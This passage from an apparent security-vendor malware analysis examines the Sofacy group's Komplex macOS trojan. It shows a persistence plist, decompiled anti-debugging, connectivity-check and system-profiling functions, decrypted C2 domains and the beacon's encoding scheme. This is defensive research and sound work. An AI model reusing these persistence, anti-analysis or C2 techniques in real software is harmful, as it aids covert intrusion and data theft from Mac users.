class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-13"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-t">false</span>/<span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-14"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-i">key</span><span class="crayon-h">&gt;</span><span class="crayon-i">RunAtLoad</span><span class="crayon-h">&lt;</span>/<span class="crayon-i">key</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-15"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-t">true</span>/<span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-16"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-i">key</span><span class="crayon-h">&gt;</span><span class="crayon-i">StandardErrorPath</span><span class="crayon-h">&lt;</span>/<span class="crayon-i">key</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-17"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-t">string</span><span class="crayon-h">&gt;</span>/<span class="crayon-i">dev</span>/<span class="crayon-t">null</span><span class="crayon-h">&lt;</span>/<span class="crayon-t">string</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-18"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-i">key</span><span class="crayon-h">&gt;</span><span class="crayon-i">StandardOutPath</span><span class="crayon-h">&lt;</span>/<span class="crayon-i">key</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-19"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-t">string</span><span class="crayon-h">&gt;</span>/<span class="crayon-i">dev</span>/<span class="crayon-t">null</span><span class="crayon-h">&lt;</span>/<span class="crayon-t">string</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-20"><span class="crayon-h">&lt;</span>/<span class="crayon-i">dict</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-21"><span class="crayon-h">&lt;</span>/<span class="crayon-i">plist</span><span class="crayon-h">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0027 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>5</em><em> Contents of the com.apple.updates.plist file showing how the dropper achieves persistence</em></p>
<h3>Komplex Payload</h3>
<p>The ultimate purpose of the aforementioned components is to install and execute the Komplex payload. The dropper component saves the payload to "/Users/Shared/.local/kextd" (SHA256: 227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5) and ultimately executes the payload. The payload begins by conducting an anti-debugging check to see if it is being debugged before proceeding with executing its main functionality, which can be seen in the “AmIBeingDebugged” function in Figure 6. The “AmIBeingDebugged” function uses the “sysctl” function to check to see if a specific “P_TRACED” flag is set, which signifies that the process is being debugged. A particularly interesting part of this function is that it is very similar to the function provided by Apple to its developers in a <a href="https://developer.apple.com/library/content/qa/qa1361/_index.html" target="_blank">guide created in 2004 titled “Detecting the Debugger”.</a> This is not the first time the Sofacy group's malware authors have obtained techniques from publicly available sources, as demonstrated in the use of the <a href="https://blog.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/" target="_blank">Office Test Persistence Method</a> that they obtained from a <a href="https://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/" target="_blank">blog posted in 2014</a>.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f4f105526544" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int AmIBeingDebugged()() {
    var_8 = **__stack_chk_guard;
    getpid();
    if ((((sysctl(0x1, 0x4, var_2A8, 0x288, 0x0, 0x0) == 0x0 ? 0x1 : 0x0) ^ 0x1) &amp; 0x1 
&amp; 0xff) != 0x0) {
            rax = __assert_rtn("AmIBeingDebugged", 
"/Users/user/Desktop/LoaderWinApi/LoaderWinApi/main.mm", 0x21, "junk == 0");
    }
    else {
            var_2C1 = (0x0 &amp; 0x800) != 0x0 ? 0x1 : 0x0;
            if (**__stack_chk_guard == var_8) {
                    rax = var_2C1 &amp; 0x1 &amp; 0xff;
            }
            else {
                    rax = __stack_chk_fail();
            }
    }
    return rax;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-2">2</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-4">4</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-6">6</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-8">8</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-10">10</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-12">12</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-14">14</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-16">16</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4f105526544-18">18</div><div class="crayon-num" data-line="crayon-67d4f94a16f4f105526544-19">19</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">AmIBeingDebugged</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_8</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span>**<span class="crayon-i">__stack_chk_guard</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">getpid</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">sysctl</span><span class="crayon-sy">(</span><span class="crayon-cn">0x1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">var_2A8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x288</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>==<span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>^<span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; 0x1 </span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-5"><span class="crayon-sy">&amp; 0xff) != 0x0) {</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-6"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax = __assert_rtn("AmIBeingDebugged", </span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-7"><span class="crayon-sy">"/Users/user/Desktop/LoaderWinApi/LoaderWinApi/main.mm", 0x21, "junk == 0");</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_2C1</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0x0</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; 0x800) != 0x0 ? 0x1 : 0x0;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span>**<span class="crayon-i">__stack_chk_guard</span><span class="crayon-h"> </span>==<span class="crayon-h"> </span><span class="crayon-i">var_8</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">rax</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">var_2C1</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; 0x1 &amp; 0xff;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">rax</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">__stack_chk_fail</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4f105526544-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">rax</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4f105526544-19"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>6</em><em> The AmIBeingDebugged function used as an anti-analysis technique</em></p>
<p>After determining that it is not running in a debugger, the payload performs an anti-analysis/sandbox check by issuing a GET request to Google, to check for Internet connectivity. The payload will sleep until it receives a response from the HTTP requests to Google, which means Komplex will only communicate to its C2 servers in Internet enabled environments. Figure 7 shows the “connectedToInternet” function that confirms whether the payload is able to communicate with “http://www.google.com” before carrying out its functionality.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f51327405054" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int connectedToInternet()() {
    if ([NSData dataWithContentsOfURL:[NSURL 
URLWithString:@"http://www.google.com"]] != 0x0) {
            var_1 = 0x1;
    }
    else {
            var_1 = 0x0;
    }
    rax = var_1 &amp; 0x1 &amp; 0xff;
    return rax;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f51327405054-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f51327405054-2">2</div><div class="crayon-num" data-line="crayon-67d4f94a16f51327405054-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f51327405054-4">4</div><div class="crayon-num" data-line="crayon-67d4f94a16f51327405054-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f51327405054-6">6</div><div class="crayon-num" data-line="crayon-67d4f94a16f51327405054-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f51327405054-8">8</div><div class="crayon-num" data-line="crayon-67d4f94a16f51327405054-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f51327405054-10">10</div><div class="crayon-num" data-line="crayon-67d4f94a16f51327405054-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f51327405054-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">connectedToInternet</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f51327405054-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-i">dataWithContentsOfURL</span><span class="crayon-sy">:</span><span class="crayon-sy">[</span><span class="crayon-e">NSURL </span></div><div class="crayon-line" id="crayon-67d4f94a16f51327405054-3"><span class="crayon-i">URLWithString</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"http://www.google.com"</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">!</span>=<span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f51327405054-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_1</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f51327405054-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f51327405054-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-67d4f94a16f51327405054-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_1</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f51327405054-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-67d4f94a16f51327405054-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">rax</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">var_1</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; 0x1 &amp; 0xff;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f51327405054-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">rax</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f51327405054-11"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>7</em><em> The connectedToInternet function testing for an active Internet connection</em></p>
<p style="text-align: left;">After confirming an active Internet connection, the Komplex payload begins carrying out its main functionality. The Komplex payload uses an 11-byte XOR algorithm to decrypt strings used for configuration and within C2 communications, including the C2 domains themselves. Figure 8 shows a screenshot of Komplex’s custom string decryption algorithm, along with the XOR key used to decrypt strings within the payload.</p>
<p style="text-align: left;"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_2.png" rel="wpdevart_lightbox"><img  class="size-large wp-image-19700 aligncenter lozad"  data-src="http://blog.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_2-500x345.png" alt="sofacy_2" width="500" height="345" /></a></p>
<p style="text-align: center;"><em>Figure </em><em>8</em><em> 11-byte XOR algorithm used by Komplex to decrypt configuration strings</em></p>
<p>The algorithm seen in Figure 8 decrypts the strings seen in Table 1, which the payload references using the associated variable names. The payload uses these decrypted strings for a variety of purposes, such as command parsing and C2 server locations.</p>
<hr />
<table>
<tbody>
<tr>
<td width="96"><strong>Variable Name</strong></td>
<td width="288"><strong>Decrypted String</strong></td>
</tr>
<tr>
<td width="96">FILE_NAME</td>
<td width="288">FileName</td>
</tr>
<tr>
<td width="96">PATHTOSAVE</td>
<td width="288">PathToSave</td>
</tr>
<tr>
<td width="96">START_BLOCK_FILE</td>
<td width="288">[file]</td>
</tr>
<tr>
<td width="96">BLOCK_EXECUTE</td>
<td width="288">Execute</td>
</tr>
<tr>
<td width="96">BLOCK_DELETE</td>
<td width="288">Delete</td>
</tr>
<tr>
<td width="96">END_BLOCK_FILE</td>
<td width="288">[/file]</td>
</tr>
<tr>
<td width="96">SERVERS</td>
<td width="288">appleupdate[.]org, apple-iclouds[.]net, itunes-helper[.]net</td>
</tr>
<tr>
<td width="96">MAC</td>
<td width="288">mac</td>
</tr>
<tr>
<td width="96">CONFIG</td>
<td width="288">config</td>
</tr>
<tr>
<td width="96">GET_CONFIG</td>
<td width="288">1</td>
</tr>
<tr>
<td width="96">FILES</td>
<td width="288">file</td>
</tr>
<tr>
<td width="96">LOG</td>
<td width="288">log</td>
</tr>
<tr>
<td width="96">OLD_CONFIG</td>
<td width="288">2</td>
</tr>
<tr>
<td width="96">ID</td>
<td width="288">id</td>
</tr>
<tr>
<td width="96">TOKEN</td>
<td width="288">h8sn3vq6kl</td>
</tr>
<tr>
<td width="96">EXTENSIONS</td>
<td width="288">.xml .pdf, .htm, .zip</td>
</tr>
</tbody>
</table>
<hr />
<p style="text-align: center;"><em>Table </em><em>1</em><em> Strings decrypted by Komplex and their referenced name</em></p>
<p>The Komplex payload uses the SERVERS variable to obtain the location of its C2, which it communicates with using HTTP POST requests. The payload generates a URL to communicate with its C2 server that has the following structure:</p>
<p>/&lt;random path&gt;/&lt;random string&gt;.&lt;chosen extension&gt;/?&lt;random string&gt;=&lt;encrypted token&gt;</p>
<p>The &lt;chosen extension&gt; portion of the URL is chosen at random from the list of legitimate file extensions: .xml, .zip, .htm and .pdf. The &lt;encrypted token&gt; within the parameters of the URL is base64 encoded ciphertext created from the string ‘h8sn3vq6kl’. The ciphertext of the string is generated via a custom algorithm that uses a random 4-byte integer as a key that is modified by XOR with the static value 0xE150722. The payload also encrypts the data sent within the POST request using the same algorithm and encodes it using base64. Figure 9 below shows an example HTTP POST sent from the payload to its C2 server.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_3.png" rel="wpdevart_lightbox"><img  class="size-large wp-image-19697 aligncenter lozad"  data-src="http://blog.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_3-500x406.png" alt="sofacy_3" width="500" height="406" /></a></p>
<p style="text-align: center;"><em>Figure </em><em>9</em><em> Beacon sent from Komplex to C2 containing system information within the HTTP POST data</em></p>
<p>The HTTP POST data in Figure 9 is comprised of information that the malware collects from the infected system. The system information sent to the C2 includes data such as the system version, username, and process list, which is gathered within a function named “getOsInfo” within the “InfoOS” class (Figure 10).</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f53365093162" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int InfoOS::getOsInfo()() {
    var_38 = rdi;
    var_18 = [[NSProcessInfo processInfo] operatingSystemVersionString];
    var_20 = NSUserName();
    var_28 = InfoOS::getProcessList();
    var_30 = operator new[](strlen(var_28) + 0x200);
    sprintf(var_30, "Mac OS X - %s %s\nUser name - %s\n\t\t\t\t\t\tProcess 
list :\n\n%s", [var_18 UTF8String], InfoOS::bitOS(), [var_20 UTF8String], 
var_28);
    rax = var_30;
    return rax;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f53365093162-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f53365093162-2">2</div><div class="crayon-num" data-line="crayon-67d4f94a16f53365093162-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f53365093162-4">4</div><div class="crayon-num" data-line="crayon-67d4f94a16f53365093162-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f53365093162-6">6</div><div class="crayon-num" data-line="crayon-67d4f94a16f53365093162-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f53365093162-8">8</div><div class="crayon-num" data-line="crayon-67d4f94a16f53365093162-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f53365093162-10">10</div><div class="crayon-num" data-line="crayon-67d4f94a16f53365093162-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f53365093162-12">12</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f53365093162-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">InfoOS</span><span class="crayon-sy">:</span><span class="crayon-sy">:</span><span class="crayon-e">getOsInfo</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f53365093162-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_38</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">rdi</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f53365093162-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_18</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSProcessInfo </span><span class="crayon-i">processInfo</span><span class="crayon-sy">]</span><span 